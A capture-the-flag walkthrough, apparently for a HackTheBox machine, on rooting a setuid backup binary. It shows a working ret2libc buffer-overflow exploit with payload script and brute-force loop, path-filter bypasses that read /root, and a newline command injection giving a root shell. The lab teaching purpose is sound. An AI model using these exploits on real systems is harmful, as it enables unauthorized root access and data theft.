gdb-peda$ r a '' 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'
...[snip]...
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x40b 
EBX: 0xffffcba0 --> 0x4 
ECX: 0x0 
EDX: 0x1 
ESI: 0xf7fa3000 --> 0x1e4d6c 
EDI: 0xffffcaef --> 0x796500 ('')
EBP: 0x72413971 ('q9Ar')
ESP: 0xffffbac0 ("Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax"...)
EIP: 0x31724130 ('0Ar1')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x31724130
[------------------------------------stack-------------------------------------]
0000| 0xffffbac0 ("Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax"...)
0004| 0xffffbac4 ("r3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9"...)
0008| 0xffffbac8 ("4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0A"...)
0012| 0xffffbacc ("Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay"...)
0016| 0xffffbad0 ("r7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3"...)
0020| 0xffffbad4 ("8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4A"...)
0024| 0xffffbad8 ("As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay"...)
0028| 0xffffbadc ("s1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x31724130 in ?? ()
```

There’s a bunch of data there, but the important part if the value of EIP at the crash, `0Ar1` or 0x31724130. Now that will give the offset to EIP:

```
oxdf@parrot$ msf-pattern_offset -l 1000 -s ABCDEFGHIJKLMNOPQRSTUVWXYZ,abcdefghijklmnopqrstuvwxyz,0123456789 -q 0Ar1
[*] Exact match at offset 512
```

That means that if I send in 512 bytes of junk and then an address, that address will overwrite the return address and eventually become EIP.

#### Protections

To figure out how to exploit the binary, I’ll need to understand what protections are in place:

```
oxdf@parrot$ checksec backup
[*] '/media/sf_CTFs/hackthebox/node-10.10.10.58/backup'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

No canaries is nice for a BOF. NX means I can’t run from the stack, but that’s overcomable.

ASLR is a setting for the OS, not the binary:

```
tom@node:/$ cat /proc/sys/kernel/randomize_va_space
2
```

It is enabled.

#### ASLR Brute

Luckily for me, the range of addresses for libc are relatively bounded:

```
tom@node:/dev/shm$ for i in {1..20}; do ldd /usr/local/bin/backup | grep libc; done
        libc.so.6 => /lib32/libc.so.6 (0xf75d1000)
        libc.so.6 => /lib32/libc.so.6 (0xf75aa000)
        libc.so.6 => /lib32/libc.so.6 (0xf7596000)
        libc.so.6 => /lib32/libc.so.6 (0xf75f3000)
        libc.so.6 => /lib32/libc.so.6 (0xf7542000)
        libc.so.6 => /lib32/libc.so.6 (0xf759f000)
        libc.so.6 => /lib32/libc.so.6 (0xf7590000)
        libc.so.6 => /lib32/libc.so.6 (0xf75b8000)
        libc.so.6 => /lib32/libc.so.6 (0xf75d6000)
        libc.so.6 => /lib32/libc.so.6 (0xf7614000)
        libc.so.6 => /lib32/libc.so.6 (0xf7548000)
        libc.so.6 => /lib32/libc.so.6 (0xf7547000)
        libc.so.6 => /lib32/libc.so.6 (0xf75c2000)
        libc.so.6 => /lib32/libc.so.6 (0xf75d7000)
        libc.so.6 => /lib32/libc.so.6 (0xf75ca000)
        libc.so.6 => /lib32/libc.so.6 (0xf7540000)
        libc.so.6 => /lib32/libc.so.6 (0xf75e8000)
        libc.so.6 => /lib32/libc.so.6 (0xf7612000)
        libc.so.6 => /lib32/libc.so.6 (0xf75c3000)
        libc.so.6 => /lib32/libc.so.6 (0xf7566000)
```

All the addresses start with 0xf7 and end with 0x000. The middle three digits change. The largest of these is typically 5, but can be 6. The three digits seem to range from 0x544 through 0x614. I’ll grab one of these, 0xf75c2000.

Because each character is four bits, and the high characters is only changing the one low bit (5 or 6), there ASLR is really only random to 9 bits, or 512 possibilities, and potentially less. I can just guess and run this lots of times, and eventually be correct. The odds of being right any one time is 0.1%. But the odds of being right in 500 attempts is ~63%.

#### Addresses

I’m going to overwrite the return address with a return to LIBC attack that calls `system('/bin/sh')` and returns to `exit`.

`readelf` will give the offsets into LIBC for the functions I want to call:

```
tom@node:/$ readelf -s /lib32/libc.so.6 | grep ' exit@@'
   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
tom@node:/$ readelf -s /lib32/libc.so.6 | grep ' system@@'
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

Finally, I need the address of the string `/bin/sh`:

```
tom@node:/$ strings -a -t x /lib32/libc.so.6 | grep '/bin/sh'
 15900b /bin/sh
```

These will go onto the stack with the address of `system` as the return address, then the address of `exit`, and then the arg to `system`, the address of “/bin/sh”.

#### Script

The box has Python3.5 on it (also Python2, but I like 3), so it doesn’t have the modern `subprocess` functions. I’ll go simple, and just write a Python script that outputs the exploit buffer.

```
#!/usr/bin/env python3

import struct
import sys

libc_base = 0xf75c2000
system = struct.pack("<I", libc_base + 0x0003a940)
exit = struct.pack("<I", libc_base + 0x0002e7b0)
binsh = struct.pack("<I", libc_base + 0x15900b)

path = b"A" * 512 + system + exit + binsh
sys.stdout.buffer.write(path)
```

Python3 is weird about printing a buffer of bytes (without `b'` at the front), but `sys.stdout.buffer.write` will do it.

Running this will print the buffer that will cause an overflow and potentially execute a shell:

```
tom@node:/dev/shm$ python3 a.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@__
                                                                                             q
```

#### Brute Force

When I run this, I have a very small chance of getting the libc address correct. However, I can run it lots of times in a loop, as failure takes only a fraction of a second. I’ll run a Bash loop:

```
tom@node:/dev/shm$ for i in {1..5000}; do backup a '' $(python3 root.py); done
...[snip]...
```

It’s important not to pass `-q`, as then the `strcpy` doesn’t happen. After a ton of junk printing out, it will eventually run Bash as root and return a shell:

```
...[snip]...
 [+] Validated access token
 [+] Starting archiving AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@__
                                                                                                                     q
# id
uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

And `root.txt`:

```
# cat /root/root.txt
1722e99c************************
```

## Beyond Root - Unintended Roots

I found a few extra ways to root this box, and one I was hopeful for that didn’t turn out.

### Read flag using ~

The checks don’t look for the `~` character. Since the binary is running as root, I can try to exfil `~`. It just pulls tom’s homedir:

```
tom@node:/dev/shm$ backup -q "" '~' | base64 -d > root.zip 
tom@node:/dev/shm$ unzip -l root.zip
Archive:  root.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-09-03 15:44   home/tom/
      655  2017-08-29 23:07   home/tom/.profile
        0  2017-08-29 23:09   home/tom/.cache/
        0  2017-08-29 23:09   home/tom/.cache/motd.legal-displayed
      220  2017-08-29 23:07   home/tom/.bash_logout
        0  2017-08-31 00:04   home/tom/.npm/
        0  2017-09-03 14:24   home/tom/.npm/_locks/
...[snip]...
```

But, `~` is set via an environment variable, which I can change.

```
tom@node:/dev/shm$ HOME=/root backup -q "" "~" | base64 -d > root.zip 
tom@node:/dev/shm$ unzip -l root.zip                        
Archive:  root.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-09-27 02:48   root/
      148  2015-08-17 16:30   root/.profile
       85  2017-09-27 02:48   root/.bash_history
        0  2017-09-03 15:33   root/.cache/
        0  2017-09-03 15:33   root/.cache/motd.legal-displayed
       33  2017-09-03 15:46   root/root.txt
     3106  2015-10-22 18:15   root/.bashrc
...[snip]...
```

It contains the real flag:

```
tom@node:/dev/shm$ unzip root.zip root/root.txt
Archive:  root.zip
[root.zip] root/root.txt password: 
 extracting: root/root.txt           
tom@node:/dev/shm$ cat root/root.txt
1722e99c************************
```

### Bypass Filters with ?/*

The filter was looking for `/root`. I’ll use `/roo?` instead, where Linux will handle `?` as a single character wildcard, and that will only match on `/root`.

```
tom@node:/dev/shm$ backup -q "" "/roo?/" | base64 -d > root.zip 
```

Getting no error on piping the output into `base64` shows that I didn’t get the troll. It does unzip:

```
tom@node:/dev/shm$ unzip root.zip 
Archive:  root.zip
   creating: root/
[root.zip] root/.profile password: 
  inflating: root/.profile           
  inflating: root/.bash_history      
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
   creating: root/.nano/
 extracting: root/.nano/search_history
```

I could also use `*` as a wildcard here to do the same thing:

```
tom@node:/dev/shm$ rm -rf root
tom@node:/dev/shm$ backup -q "" "/roo*/" | base64 -d > root.zip 
tom@node:/dev/shm$ unzip root.zip                               
Archive:  root.zip
   creating: root/
[root.zip] root/.profile password: 
  inflating: root/.profile           
  inflating: root/.bash_history      
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
   creating: root/.nano/
 extracting: root/.nano/search_history 
```

### Shell via Command Injection

The denylist of characters is pretty extensive, but it missed on that will work to command inject into `system`. A newline in `system` will work just like it does in a Bash script, breaking commands. I can try just putting a newline, then `/bin/bash` to see if that will run. I’ll enter this by entering a `'`, then hitting enter to get a newline, and then entering `/bin/bash` and then closing the `'` and hitting enter:

```
tom@node:/$ backup -q "" '
> /bin/bash'

zip error: Nothing to do! (/tmp/.backup_1131732321)
root@node:/#
```

It looks like it works, but no output comes back:

```
root@node:/# id
root@node:/# pwd
root@node:/# ls /
```

Looking at the strings in the binary, I can see the command that’s generated:

```
tom@node:/$ strings /usr/local/bin/backup  | grep '%s'
 %s[!]%s %s
 %s[+]%s %s
 %s[+]%s Starting archiving %s
/usr/bin/zip -r -P magicword %s %s > /dev/null
/usr/bin/base64 -w0 %s
```

It’s the `zip` command, and it’s clear that the output is being passed to `/dev/null`. I’ll try with an additional newline:

```
tom@node:/$ backup -q "" '            
> /bin/bash
> '

zip error: Nothing to do! (/tmp/.backup_1445476662)
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@node:/# id
uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

This time it works and returns a shell that outputs!

### Predict Filename - Fail

I considered what would happen if I was able to predict the temp file name used to save the Zip archive as. If it were purely time based, I could guess the name generated off the next few seconds, and mess with watching for those files and trying to change them, or pre-creating them as symlinks to other important files.

Unfortunately for me, the temp file name is generated from a combination of the current process process id (pid), the current time, and the current clock time for the process:

```
  pid = getpid();
  cur_time = time((time_t *)0x0);
  clock_time = clock();
  mixed = mix(cVar7,tVar6,_Var5);
  srand(mixed);
  rand_num = rand();
  sprintf(local_add,"/tmp/.backup_%i",rand_num);
```

I could potentially guess the pid of upcoming processes. I could also potentially guess the time. But there’s not a good way to guess the clock time into the process, which makes this seem too hard to pull off.
---

**Última actualización**: 2025-04-19<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
